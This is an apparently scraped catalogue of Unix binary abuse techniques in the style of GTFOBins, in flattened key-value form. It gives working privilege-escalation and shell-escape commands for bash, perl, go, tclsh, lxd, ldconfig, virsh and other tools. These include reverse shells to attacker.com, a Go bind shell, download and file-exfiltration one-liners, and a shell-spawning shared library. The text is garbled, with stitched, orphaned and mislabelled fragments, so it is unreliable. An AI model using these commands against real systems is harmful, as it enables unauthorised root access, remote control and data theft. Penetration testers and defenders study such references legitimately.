name: acr
description: This executable can run non-interactive system commands.

functions.name: Command
functions.description: This executable can run non-interactive system commands.

contexts.name: Sudo
contexts.description: This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.

contexts.name: SUID
contexts.description: This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.
notes: This executable runs commands using the system shell, e.g., via functions like `system`, so it only works for distributions where the shell does not drop SUID privileges.

contexts.name: Unprivileged
contexts.description: This function can be performed by any unprivileged user.

blind.true: The commands are executed but their output is hidden from the attacker.

functions.description: This executable can spawn an interactive system shell.

contexts.description: This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.
notes: This executable runs commands directly, e.g., via functions like `exec`, remember to omit the `-p` argument of every `/bin/sh` invocation for distributions where the default shell does not drop SUID privileges.

name: bash
description: This executable can download remote data.

functions.name: Download
functions.description: This executable can download remote data.
code_examples:
bash -c '{ echo -ne "GET /path/to/input-file HTTP/1.0
host: attacker.com

" 1>&3; cat 0<&3; } \
    3<>/dev/tcp/attacker.com/12345 \
    | { while read -r; do [ "$REPLY" = "$(echo -ne "")" ] && break; done; cat; } >/path/to/output-file'

bash -p -c '{ echo -ne "GET /path/to/input-file HTTP/1.0
host: attacker.com

" 1>&3; cat 0<&3; } \
    3<>/dev/tcp/attacker.com/12345 \
    | { while read -r; do [ "$REPLY" = "$(echo -ne "")" ] && break; done; cat; } >/path/to/output-file'

functions.name: Library load
functions.description: This executable can load shared libraries that may be used to run arbitrary code in the same execution context.
code_examples:
echo '__attribute__((constructor)) init() { execl("/bin/sh", "sh", 0); }' \
    | gcc -w -fPIC -shared -o lib.so -x c -

contexts.name: Sudo
contexts.description: This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.

contexts.name: SUID
contexts.description: This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.

contexts.name: Unprivileged
contexts.description: This function can be performed by any unprivileged user.

extra.payload:
As an example, the following can be used to create a minimal shared library (`lib.so`) that spawns a shell upon loading:

```
echo '__attribute__((constructor)) init() { execl("/bin/sh", "sh", 0); }' \
    | gcc -w -fPIC -shared -o lib.so -x c -
```

Add the usual `-p` argument to the shell for SUID contexts. Consider calling `setuid(0);` beforehand if the executable has the `CAP_SETUID` capability assigned.

name: chmod
description: This executable provides a mechanism for privilege escalation by indirectly enabling elevated privileges, such as setting the SUID bit or modifying the ownership of another executable.

functions.description: This executable provides a mechanism for privilege escalation by indirectly enabling elevated privileges, such as setting the SUID bit or modifying the ownership of another executable.

contexts.name: Sudo
contexts.description: This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.

contexts.name: SUID
contexts.description: This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.

examples.comment: This can be run with elevated privileges to change permissions (`6` denotes the SUID bits) and then read, write, or execute a file.

functions.name: Library load
functions.description: This executable can load shared libraries that may be used to run arbitrary code in the same execution context.
code_examples:
echo '__attribute__((constructor)) init() { execl("/bin/sh", "sh", 0); }' \
    | gcc -w -fPIC -shared -o lib.so -x c -

contexts.name: Sudo
contexts.description: This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.

contexts.name: SUID
contexts.description: This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.

contexts.name: Unprivileged
contexts.description: This function can be performed by any unprivileged user.

extra.payload:
As an example, the following can be used to create a minimal shared library (`lib.so`) that spawns a shell upon loading:

```
echo '__attribute__((constructor)) init() { execl("/bin/sh", "sh", 0); }' \
    | gcc -w -fPIC -shared -o lib.so -x c -
```

Add the usual `-p` argument to the shell for SUID contexts. Consider calling `setuid(0);` beforehand if the executable has the `CAP_SETUID` capability assigned.

description: This executable can write data to local files.

functions.name: File write
functions.description: This executable can write data to local files.

contexts.name: Unprivileged
contexts.description: This function can be performed by any unprivileged user.

examples.comment:
It can be used to write files using a specially crafted SMBIOS file that can be read as a memory device by dmidecode.
Generate the file with [dmiwrite](https://github.com/adamreiser/dmiwrite) and upload it to the target.

- `--dump-bin`, will cause dmidecode to write the payload to the destination specified, prepended with 32 null bytes.

- `--no-sysfs`, if the target system is using an older version of dmidecode, you may need to omit the option.

```
make dmiwrite
echo DATA >/path/to/temp-file
./dmiwrite /path/to/temp-file x.dmi
```

echo 'exec /bin/sh' >x.sh

name: dstat
description: This executable can inherit functions from another.

functions.name: Inherit
functions.description: This executable can inherit functions from another.

contexts.name: Sudo
contexts.description: This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.

contexts.name: Unprivileged
contexts.description: This function can be performed by any unprivileged user.

examples.comment:
`dstat` allows you to run arbitrary Python scripts loaded as "external plugins" if they are located in one of the directories, stated in the `dstat` man page under "FILES":

- `~/.dstat/`
- `(path of binary)/plugins/`
- `/usr/share/dstat/`
- `/usr/local/share/dstat/`

Pick the one that you can write into. The plugin named `xxx` file name must be defined in the `dstat_xxx.py` file.

contexts.description: This function can be performed by any unprivileged user.

examples.comment:
This allows to run Python code (`...`). It executes a Python script named `setup.py` in the directory passed as argument (`.`).

Keep in mind that the TTY is lost, so `/dev/tty` can be used, for example:

```
echo 'import os; os.system("exec /bin/sh </dev/tty >/dev/tty 2>/dev/tty")' >setup.py
```

name: fail2ban-client
description: This executable can run non-interactive system commands.

functions.name: Command
functions.description: This executable can run non-interactive system commands.
code_examples:
fail2ban-client add x
fail2ban-client set x addaction x
fail2ban-client set x action x actionban /path/to/command
fail2ban-client start x
fail2ban-client set x banip 999.999.999.999
fail2ban-client set x unbanip 999.999.999.999
fail2ban-client stop x

cat >/path/to/temp-dir/fail2ban.conf <<EOF
[Definition]
EOF

cat >/path/to/temp-dir/jail.local <<EOF
[x]
enabled = true
action = x
EOF

mkdir -p /path/to/temp-dir/action.d/
cat >/path/to/temp-dir/action.d/x.conf <<EOF
[Definition]
actionstart = /path/to/command
EOF

mkdir -p /path/to/temp-dir/filter.d/
cat >/path/to/temp-dir/filter.d/x.conf <<EOF
[Definition]
EOF

fail2ban-client -c /path/to/temp-dir/ -v restart

examples.code:
fail2ban-client add x

name: ffmpeg
description: This executable can load shared libraries that may be used to run arbitrary code in the same execution context.

functions.name: Library load
functions.description: This executable can load shared libraries that may be used to run arbitrary code in the same execution context.
code_examples:
echo '__attribute__((constructor)) init() { execl("/bin/sh", "sh", 0); }' \
    | gcc -w -fPIC -shared -o lib.so -x c -

contexts.name: Sudo
contexts.description: This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.

contexts.name: SUID
contexts.description: This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.

contexts.name: Unprivileged
contexts.description: This function can be performed by any unprivileged user.

extra.payload:
As an example, the following can be used to create a minimal shared library (`lib.so`) that spawns a shell upon loading:

```
echo '__attribute__((constructor)) init() { execl("/bin/sh", "sh", 0); }' \
    | gcc -w -fPIC -shared -o lib.so -x c -
```

Add the usual `-p` argument to the shell for SUID contexts. Consider calling `setuid(0);` beforehand if the executable has the `CAP_SETUID` capability assigned.

examples:
echo '__attribute__((constructor)) init() { execl("/bin/sh", "sh", 0); }' \
    | gcc -w -fPIC -shared -o lib.so -x c -

name: go
description: This executable can bind a system shell to a local port waiting for an attacker to connect.

functions.name: Bind shell
functions.description: This executable can bind a system shell to a local port waiting for an attacker to connect.
code_examples:
echo -e 'package main
import (
	"os"
	"syscall"
)

func main(){
	fd, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0)
	addr := &syscall.SockaddrInet4{Port: 12345}
	copy(addr.Addr[:], []byte{0,0,0,0})
	syscall.Bind(fd, addr)
	syscall.Listen(fd, 1)
	nfd, _, _ := syscall.Accept(fd)
	syscall.Dup2(nfd, 0)
	syscall.Dup2(nfd, 1)
	syscall.Dup2(nfd, 2)
	syscall.Exec("/bin/sh", []string{"/bin/sh", "-i"}, os.Environ())
}' >/path/to/temp-file.go
go run /path/to/temp-file.go

code_examples: julia -e 'using Sockets; sock=connect("attacker.com", parse(Int64, 12345)); while true; cmd = readline(sock); if !isempty(cmd); cmd = split(cmd); ioo = IOBuffer(); ioe = IOBuffer(); run(pipeline(`$cmd`, stdout=ioo, stderr=ioe)); write(sock, String(take!(ioo)) * String(take!(ioe))); end; end;'

As an example, the following can be used to create a minimal shared library (`lib.so`) that spawns a shell upon loading:

    | gcc -w -fPIC -shared -o lib.so -x c -

Add the usual `-p` argument to the shell for SUID contexts. Consider calling `setuid(0);` beforehand if the executable has the `CAP_SETUID` capability assigned.

    user: x
  name: x
current-context: x
users:

      command: /bin/sh

EOF

name: ldconfig
description: This executable can load shared libraries that may be used to run arbitrary code in the same execution context.

functions.name: Library load
functions.description: This executable can load shared libraries that may be used to run arbitrary code in the same execution context.
code_examples:
echo '__attribute__((constructor)) init() { execl("/bin/sh", "sh", 0); }' \
    | gcc -w -fPIC -shared -o lib.so -x c -

contexts.name: Sudo
contexts.description: This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.

contexts.name: SUID
contexts.description: This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.

contexts.name: Unprivileged
contexts.description: This function can be performed by any unprivileged user.

examples.comment:
This allows to override one or more shared libraries (e.g., `libpcap`) globally, then triggers the execution by running a program that uses it, e.g., `ping`. This is particularly useful if the target binary is SUID. Beware though that it is easy to end up with a broken target system.

First identify the shared libraries used by the target program, for example:

```
$ ldd /bin/ping | grep libcap
        libcap.so.2 => /path/to/temp-dir/libcap.so.2 (0x00007f8417eef000)
```

Then create the shared library override, named `libcap.so.2`, and put in in `/path/to/temp-dir/`. The program might require some exported symbols from the library override, in that case make sure to add them (e.g., `void cap_get_flag() {}`).

extra.payload:
As an example, the following can be used to create a minimal shared library (`lib.so`) that spawns a shell upon loading:

```
echo '__attribute__((constructor)) init() { execl("/bin/sh", "sh", 0); }' \
    | gcc -w -fPIC -shared -o lib.so -x c -
```

Add the usual `-p` argument to the shell for SUID contexts. Consider calling `setuid(0);` beforehand if the executable has the `CAP_SETUID` capability assigned.

name: lxd
description: This executable can spawn an interactive system shell.

functions.name: Shell
functions.description: This executable can spawn an interactive system shell.
code_examples:
lxc init ubuntu:16.04 x -c security.privileged=true
lxc config device add x x disk source=/ path=/mnt/ recursive=true
lxc start x
lxc exec x /bin/sh

lxc image import ./alpine*.tar.gz --alias x
lxc init x x -c security.privileged=true
lxc config device add x x disk source=/ path=/mnt/ recursive=true
lxc start x
lxc exec x /bin/sh

examples.code:

examples.code:
lxc image import ./alpine*.tar.gz --alias x

lxc config device add x x disk source=/ path=/mnt/ recursive=true

contexts.name: SUID

contexts.code:

examples.comment:
This requires steps to be run offline, then the resulting image must be uploaded to target. Build the local image with [lxd-alpine-builder](https://github.com/saghul/lxd-alpine-builder):

```
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sudo ./build-alpine -a i686
```

name: mysql
description: A valid MySQL server must be available to connect to.

functions.name: Library load
functions.description: This executable can load shared libraries that may be used to run arbitrary code in the same execution context.
code_examples:
echo '__attribute__((constructor)) init() { execl("/bin/sh", "sh", 0); }' \
    | gcc -w -fPIC -shared -o lib.so -x c -

contexts.name: Sudo
contexts.description: This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.

contexts.name: SUID
contexts.description: This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.

contexts.name: Unprivileged
contexts.description: This function can be performed by any unprivileged user.

examples.comment: The following loads the `/path/to/lib.so` shared object.

extra.payload:
As an example, the following can be used to create a minimal shared library (`lib.so`) that spawns a shell upon loading:

```
echo '__attribute__((constructor)) init() { execl("/bin/sh", "sh", 0); }' \
    | gcc -w -fPIC -shared -o lib.so -x c -
```

Add the usual `-p` argument to the shell for SUID contexts. Consider calling `setuid(0);` beforehand if the executable has the `CAP_SETUID` capability assigned.

functions.name: Library load
functions.description: This executable can load shared libraries that may be used to run arbitrary code in the same execution context.
code_examples:
echo '__attribute__((constructor)) init() { execl("/bin/sh", "sh", 0); }' \
    | gcc -w -fPIC -shared -o lib.so -x c -

contexts.name: Sudo
contexts.description: This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.

contexts.name: SUID
contexts.description: This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.

contexts.name: Unprivileged
contexts.description: This function can be performed by any unprivileged user.

examples.comment: Alternatively, the `ssl_engine` directive can be used.

extra.payload:
As an example, the following can be used to create a minimal shared library (`lib.so`) that spawns a shell upon loading:

```
echo '__attribute__((constructor)) init() { execl("/bin/sh", "sh", 0); }' \
    | gcc -w -fPIC -shared -o lib.so -x c -
```

Add the usual `-p` argument to the shell for SUID contexts. Consider calling `setuid(0);` beforehand if the executable has the `CAP_SETUID` capability assigned.

    | gcc -w -fPIC -shared -o lib.so -x c -

contexts.name: Sudo

extra.payload:
As an example, the following can be used to create a minimal shared library (`lib.so`) that spawns a shell upon loading:

```
echo '__attribute__((constructor)) init() { execl("/bin/sh", "sh", 0); }' \
    | gcc -w -fPIC -shared -o lib.so -x c -
```

Add the usual `-p` argument to the shell for SUID contexts. Consider calling `setuid(0);` beforehand if the executable has the `CAP_SETUID` capability assigned.

name: perl
description: This executable can download remote data.

functions.name: Download
functions.description: This executable can download remote data.
code_examples:
perl -MIO::Socket::INET -e '$s=new IO::Socket::INET(PeerAddr=>"attacker.com",PeerPort=>80,Proto=>"tcp") or die; print $s "GET /path/to/input-file HTTP/1.1
Host: attacker.com
Metadata: true
Connection: close

"; open(my $fh, ">", "/path/to/output-file") or die; $in_content = 0; while (<$s>) { if ($in_content) { print $fh $_; } elsif ($_ eq "
") { $in_content = 1; } } close($s); close($fh);'

code_examples:
perl -MIO::Socket::INET -e '$s = new IO::Socket::INET(PeerAddr=>"attacker.com", PeerPort=>80, Proto=>"tcp") or die;open(my $file, "<", "/path/to/input-file") or die;$content = join("", <$file>);close($file);$headers = "POST / HTTP/1.1
Host: attacker.com
Content-Type: application/x-www-form-urlencoded
Content-Length: " . length($content) . "
Connection: close

";print $s $headers . $content;while (<$s>) { }close($s);'

examples.comment:
This allows to run Python code (`...`). It executes a Python script named `setup.py` in the directory passed as argument (`.`).

Keep in mind that the TTY is lost, so `/dev/tty` can be used, for example:

```
echo 'import os; os.system("exec /bin/sh </dev/tty >/dev/tty 2>/dev/tty")' >setup.py
```

The `--break-system-packages` flag can be omitted in older systems.

functions.name: Library load
functions.description: This executable can load shared libraries that may be used to run arbitrary code in the same execution context.
code_examples:
echo '__attribute__((constructor)) init() { execl("/bin/sh", "sh", 0); }' \
    | gcc -w -fPIC -shared -o lib.so -x c -

contexts.name: Capabilities
contexts.description: This function is performed bypassing the usual kernel permission checks if the executable has certain capabilities set.
notes: The following capabilities are needed: CAP_SETUID

contexts.name: Sudo
contexts.description: This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.

contexts.name: SUID
contexts.description: This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.

contexts.name: Unprivileged
contexts.description: This function can be performed by any unprivileged user.

extra.payload:
As an example, the following can be used to create a minimal shared library (`lib.so`) that spawns a shell upon loading:

```
echo '__attribute__((constructor)) init() { execl("/bin/sh", "sh", 0); }' \
    | gcc -w -fPIC -shared -o lib.so -x c -
```

Add the usual `-p` argument to the shell for SUID contexts. Consider calling `setuid(0);` beforehand if the executable has the `CAP_SETUID` capability assigned.

functions.name: Reverse shell
functions.description: This executable can send back a reverse system shell to a listening attacker.
code_examples:
python -c 'import sys,socket,os,pty;s=socket.socket()
s.connect(("attacker.com",12345))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")'

examples.code:

blind.true: The commands are executed but their output is hidden from the attacker.

functions.name: Library load
functions.description: This executable can load shared libraries that may be used to run arbitrary code in the same execution context.
code_examples:
echo '__attribute__((constructor)) init() { execl("/bin/sh", "sh", 0); }' \
    | gcc -w -fPIC -shared -o lib.so -x c -

contexts.name: Sudo
contexts.description: This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.

contexts.name: Unprivileged
contexts.description: This function can be performed by any unprivileged user.

extra.payload:
As an example, the following can be used to create a minimal shared library (`lib.so`) that spawns a shell upon loading:

```
echo '__attribute__((constructor)) init() { execl("/bin/sh", "sh", 0); }' \
    | gcc -w -fPIC -shared -o lib.so -x c -
```

Add the usual `-p` argument to the shell for SUID contexts. Consider calling `setuid(0);` beforehand if the executable has the `CAP_SETUID` capability assigned.

rustup toolchain link x /path/to/temp-dir/

mkdir -p meta/hooks

name: ssh-keygen
description: This executable can load shared libraries that may be used to run arbitrary code in the same execution context.

functions.name: Library load
functions.description: This executable can load shared libraries that may be used to run arbitrary code in the same execution context.
code_examples:
echo '__attribute__((constructor)) init() { execl("/bin/sh", "sh", 0); }' \
    | gcc -w -fPIC -shared -o lib.so -x c -

contexts.name: Sudo
contexts.description: This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.

contexts.name: SUID
contexts.description: This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.

contexts.name: Unprivileged
contexts.description: This function can be performed by any unprivileged user.

examples.comment: The shared library must contain the `void C_GetFunctionList() {}` function.

extra.payload:
As an example, the following can be used to create a minimal shared library (`lib.so`) that spawns a shell upon loading:

```
echo '__attribute__((constructor)) init() { execl("/bin/sh", "sh", 0); }' \
    | gcc -w -fPIC -shared -o lib.so -x c -
```

Add the usual `-p` argument to the shell for SUID contexts. Consider calling `setuid(0);` beforehand if the executable has the `CAP_SETUID` capability assigned.

examples:
echo '__attribute__((constructor)) init() { execl("/bin/sh", "sh", 0); }' \
    | gcc -w -fPIC -shared -o lib.so -x c -

name: tclsh
description: This executable can load shared libraries that may be used to run arbitrary code in the same execution context.

functions.name: Library load
functions.description: This executable can load shared libraries that may be used to run arbitrary code in the same execution context.
code_examples:
echo '__attribute__((constructor)) init() { execl("/bin/sh", "sh", 0); }' \
    | gcc -w -fPIC -shared -o lib.so -x c -

contexts.name: Capabilities
contexts.description: This function is performed bypassing the usual kernel permission checks if the executable has certain capabilities set.

contexts.name: Sudo
contexts.description: This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.

contexts.name: SUID
contexts.description: This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.

contexts.name: Unprivileged
contexts.description: This function can be performed by any unprivileged user.

extra.payload:
As an example, the following can be used to create a minimal shared library (`lib.so`) that spawns a shell upon loading:

```
echo '__attribute__((constructor)) init() { execl("/bin/sh", "sh", 0); }' \
    | gcc -w -fPIC -shared -o lib.so -x c -
```

Add the usual `-p` argument to the shell for SUID contexts. Consider calling `setuid(0);` beforehand if the executable has the `CAP_SETUID` capability assigned.

functions.name: Reverse shell
functions.description: This executable can send back a reverse system shell to a listening attacker.
code_examples:
tclsh
set s [socket attacker.com 12345];while 1 { puts -nonewline $s "> ";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;

    | gcc -w -fPIC -shared -o lib.so -x c -

tclsh
set s [socket attacker.com 12345];while 1 { puts -nonewline $s "> ";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;

name: unsquashfs
description:
`unsquashfs` preserve the SUID bit when extracting the file system. For example, prepare an archive beforehand with the following commands as root:

```
cp /bin/sh .
chmod +s sh
mksquashfs sh shell
```

name: virsh
description: This executable can run non-interactive system commands.

functions.name: Command
functions.description: This executable can run non-interactive system commands.
code_examples:
cat >/path/to/temp-file.xml <<EOF
<domain type='kvm'>
  <name>x</name>
  <os>
    <type arch='x86_64'>hvm</type>
  </os>
  <memory unit='KiB'>1</memory>
  <devices>
    <interface type='ethernet'>
      <script path='/path/to/command'/>
    </interface>
  </devices>
</domain>
EOF
virsh -c qemu:///system create /path/to/temp-file.xml
virsh -c qemu:///system destroy x

examples.code:
cat >/path/to/temp-file.xml <<EOF
<domain type='kvm'>

  <os>

  </os>
  <memory unit='KiB'>1</memory>
  <devices>
    <interface type='ethernet'>
      <script path='/path/to/command'/>
    </interface>
  </devices>
</domain>
EOF
virsh -c qemu:///system create /path/to/temp-file.xml
virsh -c qemu:///system destroy x

contexts.name: Sudo

blind.true: The commands are executed but their output is hidden from the attacker.

functions.name: File write
functions.description: This executable can write data to local files.
code_examples:
echo DATA >/path/to/temp-file

cat >/path/to/temp-file.xml <<EOF
<volume type='file'>
  <name>y</name>
  <key>/path/to/output-dir/output-file</key>
  <source>
  </source>
  <capacity unit='bytes'>5</capacity>
  <allocation unit='bytes'>4096</allocation>
  <physical unit='bytes'>5</physical>
  <target>
    <path>/path/to/output-dir/output-file</path>
    <format type='raw'/>
    <permissions>
      <mode>0600</mode>
      <owner>0</owner>
      <group>0</group>
    </permissions>
  </target>
</volume>
EOF

virsh -c qemu:///system pool-create-as x dir --target /path/to/output-dir/
virsh -c qemu:///system vol-create --pool x --file /path/to/temp-file.xml
virsh -c qemu:///system vol-upload --pool x /path/to/output-dir/output-file /path/to/temp-file
virsh -c qemu:///system pool-destroy x

virsh -c qemu:///system pool-create-as x dir --target /path/to/dir/
virsh -c qemu:///system vol-download --pool x input-file output-file
virsh -c qemu:///system pool-destroy x

contexts.description: This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.

examples.comment: The file on the remote host must have the `.rpm` extension, but the content does not have to be an RPM file. The file will be downloaded to a randomly created directory in `/var/tmp/yum-root-xxxxxx/`.

references.comment: An HTTP server can be used on the attacker box to send the data.

binary.false: The content is corrupted or otherwise altered by the process, thus it might not be suitable for handling arbitrary binary data.

tcp-client.comment: A TCP client can be used on the attacker box to send the data.

tcp-server.comment: A TCP server can be used on the attacker box to send the data.

http-client.comment: An HTTP client can be used on the attacker box to send the data.

http-server.comment: An HTTP server can be used on the attacker box to send the data.

ftp-server.comment: An FTP server can be used on the attacker box to send the data.

ssh-server.comment: An SSH server can be used on the attacker box to send the data.

tls-server.comment: A TLS server can be used on the attacker box to send the data.
tls-server.code:
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port 12345 </path/to/input-file

functions.name: Inherit
functions.description: This executable can inherit functions from another.
code_examples:
cat >/path/to/temp-dir/x<<EOF
[main]
plugins=1
pluginpath=/path/to/temp-dir/
pluginconfpath=/path/to/temp-dir/
EOF

cat >/path/to/temp-dir/y.conf<<EOF
[main]
enabled=1
EOF

cat >/path/to/temp-dir/y.py<<EOF
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  ...
EOF

yum -c /path/to/temp-dir/x --enableplugin=y

name: zic
description: This executable can run non-interactive system commands.

functions.name: Command
functions.description: This executable can run non-interactive system commands.
code_examples:
echo 'Rule Jordan 0 1 xxx Jan lastSun 2 1:00d -' >/path/to/temp-file
echo 'Zone Test 2:00 Jordan CE%sT' >>/path/to/temp-file
zic -d . -y /path/to/command /path/to/temp-file

examples.code:
echo 'Rule Jordan 0 1 xxx Jan lastSun 2 1:00d -' >/path/to/temp-file
echo 'Zone Test 2:00 Jordan CE%sT' >>/path/to/temp-file
zic -d . -y /path/to/command /path/to/temp-file

contexts.name: Sudo
contexts.description: This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.
contexts.code:
echo 'Rule Jordan 0 1 xxx Jan lastSun 2 1:00d -' >/path/to/temp-file
echo 'Zone Test 2:00 Jordan CE%sT' >>/path/to/temp-file
zic -d . -y /path/to/command /path/to/temp-file

contexts.name: SUID
contexts.description: This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.
contexts.code:
echo 'Rule Jordan 0 1 xxx Jan lastSun 2 1:00d -' >/path/to/temp-file
echo 'Zone Test 2:00 Jordan CE%sT' >>/path/to/temp-file
zic -d . -y /path/to/command /path/to/temp-file

contexts.name: Unprivileged
contexts.description: This function can be performed by any unprivileged user.
contexts.code:
echo 'Rule Jordan 0 1 xxx Jan lastSun 2 1:00d -' >/path/to/temp-file
echo 'Zone Test 2:00 Jordan CE%sT' >>/path/to/temp-file
zic -d . -y /path/to/command /path/to/temp-file

examples.comment:
This executes the command twice:

- `/path/to/command 0 xxx`
- `/path/to/command 1 xxx`

Additionally the `Test` file is created.

blind.true: The commands are executed but their output is hidden from the attacker.

examples:

echo 'Zone Test 2:00 Jordan CE%sT' >>/path/to/temp-file
zic -d . -y /path/to/command /path/to/temp-file
